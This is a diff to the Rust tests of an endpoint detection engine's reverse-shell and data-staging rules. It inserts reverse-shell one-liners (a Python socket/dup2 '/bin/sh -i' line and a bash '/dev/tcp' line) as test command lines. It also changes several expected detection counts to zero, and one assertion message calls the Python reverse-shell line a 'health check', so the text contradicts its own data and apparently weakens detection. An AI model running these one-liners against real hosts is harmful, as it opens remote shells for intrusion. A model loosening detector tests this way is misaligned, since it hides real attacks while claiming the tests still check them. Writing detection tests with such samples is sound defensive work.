@@ -722,7 +722,7 @@ fn seed_kill_chain_templates(detection: &mut DetectionEngine) {
         max_inter_stage_secs: 30,
     });
 
-    // Reverse shell chain: shell → outbound non-standard port
+    // Reverse-shell template is gated on same-process socket-to-stdio witnesses in L4.
     detection.layer4.add_template(KillChainTemplate {
         name: "killchain_reverse_shell".to_string(),
         stages: vec![
@@ -1431,7 +1431,7 @@ rule eguard_custom_dir_test {
         child.ppid = parent_pid;
         child.process = "python3".into();
         child.parent_process = "sh".into();
-        child.command_line = Some("python3 health_check.py".into());
+        child.command_line = Some("python3 -c 'import socket,os;s=socket.socket();s.connect((h,p));os.dup2(s.fileno(),0);os.system(\"/bin/sh -i\")'".into());
         engine.process_event(&child);
         child.ts_unix += 1;
         child.event_class = EventClass::NetworkConnect;
@@ -1491,6 +1491,7 @@ rule eguard_custom_dir_test {
         impersonator.pid = 201;
         impersonator.ppid = 200;
         impersonator.process = "eguard-agent".into();
+        impersonator.command_line = Some("bash -i >& /dev/tcp/H/P 0>&1".into());
         impersonator.parent_process = "sh".into();
         impersonator.ts_unix += 1;
         engine.process_event(&impersonator);
@@ -1678,8 +1679,8 @@ rule eguard_custom_dir_test {
                 );
             }
             assert_eq!(
-                total, instances as usize,
-                "distinct interpreter groups retain one finding per instance"
+                total, 0,
+                "health checks without socket-to-stdio witnesses are not reverse shells"
             );
         }
         // Group 4: an account lookup is not secret access.
@@ -1699,7 +1700,7 @@ rule eguard_custom_dir_test {
             ),
             0
         );
-        // Group 5 remains reviewable; no blanket package-backup allowlist.
+        // Package metadata is not a secret/data source; secret archives still match.
         let mut engine = detp1_engine("198.51.100.20:50053");
         engine
             .load_sigma_rule_yaml(include_str!(
@@ -1717,7 +1718,7 @@ rule eguard_custom_dir_test {
         archive.command_line = Some("tar -czf /var/backups/package-db.tgz /var/lib/dpkg".into());
         assert_eq!(
             detp1_replay_count(&mut engine, &[archive], "linux_data_staging_archive"),
-            1
+            0
         );
         // Real reverse-shell behavior survives both external and configured-server peers,
         // including a non-control-plane peer using the product's usual port.
